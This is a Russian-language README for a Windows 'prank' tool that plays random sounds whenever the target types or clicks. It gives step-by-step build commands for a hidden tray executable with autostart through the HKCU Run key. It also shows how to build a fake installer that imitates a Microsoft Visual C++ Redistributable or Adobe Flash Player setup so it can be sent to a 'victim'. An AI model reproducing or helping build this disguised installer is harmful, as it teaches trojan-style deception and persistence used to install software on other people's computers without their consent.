# Prank Template — сделай свой пранк с нуля

Шаблон для создания пранков на Windows. Когда жертва нажимает клавиши или кликает мышкой — играют случайные звуки. Программа висит в трее, запускается скрытно и стартует вместе с Windows.

В репозитории уже есть Sounds of GachiMuchi — можешь использовать как есть, либо заменить на свои звуки.

---

## Как сделать свой пранк — пошагово

### Шаг 1. Скачай репозиторий

```bash
git clone https://github.com/maf1kkk/GACHI_Prank.git
cd GACHI_Prank
pip install -r requirements.txt
```

### Шаг 2. Добавь свои звуки

Положи `.mp3`, `.wav`, `.ogg`, `.flac` или `.m4a` файлы в папку `sounds/`.

Чем больше звуков — тем дольше жертва не поймёт что происходит.

> **Совет:** короткие звуки (до 3 секунд) работают лучше всего — они не успевают надоесть и срабатывают чаще на быстрые нажатия.

### Шаг 3. Настрой поведение

Открой `config.json`:

```json
{
    "hotkeys": ["space","ctrl","w","a","s","d"],
    "mouse_buttons": ["left","right"],
    "cooldown_ms": 300,
    "autostart": true,
    "priority_keywords": ["oh","ah","yeah","fuck"],
    "priority_weight": 3,
    "exit_hotkey": "ctrl+alt+shift+f12"
}
```

**Что тут можно менять:**

| Параметр | Что делает |
|----------|-----------|
| `hotkeys` | Клавиши, при нажатии на которые играет звук |
| `mouse_buttons` | Кнопки мыши (`left`, `right`, `middle`, `x1`, `x2`) |
| `cooldown_ms` | Задержка между звуками в миллисекундах |
| `autostart` | Автозагрузка с Windows (`true`/`false`) |
| `priority_keywords` | Слова в названиях файлов — такие звуки играют чаще |
| `priority_weight` | Во сколько раз чаще (3 = в 3 раза чаще) |
| `exit_hotkey` | Горячая клавиша для выхода и удаления из автозагрузки |

### Шаг 4. Собери тестовую версию

`Prank_Test.exe` — показывает консоль, чтобы ты видел что происходит:

```bash
pyinstaller --onefile --console --name Prank_Test src/main.py
```

Запусти `dist/Prank_Test.exe` и проверь что звуки играют при нажатии клавиш.

### Шаг 5. Собери скрытую версию

`Prank.exe` — без консоли, висит в трее невидимо:

```bash
pyinstaller --onefile --windowed --name Prank src/main.py
```

### Шаг 6. Собери установщик для жертвы

Установщик маскируется под установку обычной программы.

Сначала настрой его внешний вид. Создай в корне проекта файл `installer_config.json`:

```json
{
    "window_title": "Microsoft Visual C++ Redistributable Setup",
    "header_text": "Microsoft Visual C++ Redistributable",
    "version_text": "Version 14.42.2025",
    "install_folder": "WindowsCppRedist",
    "startup_name": "WindowsCppRedist",
    "exe_name": "Prank.exe",
    "finish_button_text": "Finish"
}
```

Теперь собери:

```bash
pyinstaller --onefile --windowed --name Setup --add-data "dist/Prank.exe;." --add-data "sounds;sounds" --add-data "config.json;." src/installer.py
```

Готовый `dist/Setup.exe` можно отправлять жертве.

**Что делает установщик:**
1. Показывает окно "Microsoft Visual C++ Redistributable Setup" с прогресс-баром
2. Копирует `Prank.exe`, звуки и конфиг в `%ProgramData%\WindowsCppRedist\`
3. Прописывает себя в автозагрузку (HKCU Run)
4. Запускает пранк
5. Показывает "Installation complete!"

### Шаг 7. Чистка

Если нужно удалить пранк с компьютера — запусти `remove_prank.bat` от имени администратора. Он убьёт процесс, удалит файлы и почистит реестр.

---

## Кастомизация установщика

Хочешь чтобы установщик выглядел как другая программа? Меняй поля в `installer_config.json`:

| Поле | Пример |
|------|--------|
| `window_title` | `"Adobe Flash Player Setup"` |
| `header_text` | `"Adobe Flash Player"` |
| `version_text` | `"Version 32.0.0.465"` |
| `install_folder` | `"AdobeFlash"` |
| `startup_name` | `"AdobeFlashUpdater"` |
| `exe_name` | `"Prank.exe"` |

> Не меняй `exe_name` — это имя твоего собранного prank-файла.

---

## Примеры использования

### Вариант A: Заменить звуки (Gachi → свои)

1. Очисти `sounds/`
2. Закинь свои звуки
3. Поменяй `priority_keywords` под свои файлы
4. Пересобери `Prank.exe` и `Setup.exe`

### Вариант B: Сделать "тихий" пранк (только мышь)

```json
"hotkeys": [],
"mouse_buttons": ["left", "right"]
```

Звуки будут играть только при кликах — жертва долго не поймёт откуда звук.

### Вариант C: Убрать автозагрузку (одноразовый пранк)

```json
"autostart": false
```

Для розыгрыша на своём компьютере — запустил, поиграло, закрыл.

---

## Структура файлов

```
gachi_prank/
├── src/
│   ├── main.py            # движок пранка (скрытый, трей, хоткеи)
│   └── installer.py       # фейковый установщик
├── sounds/                # сюда кидаешь свои звуки
├── config.json            # настройки пранка
├── installer_config.json  # настройки внешнего вида установщика
├── remove_prank.bat       # скрипт для удаления
├── requirements.txt
└── README.md
```

## Системные требования

- Windows 10 или 11
- Python 3.10+ (чтобы собирать)

## Лицензия

MIT
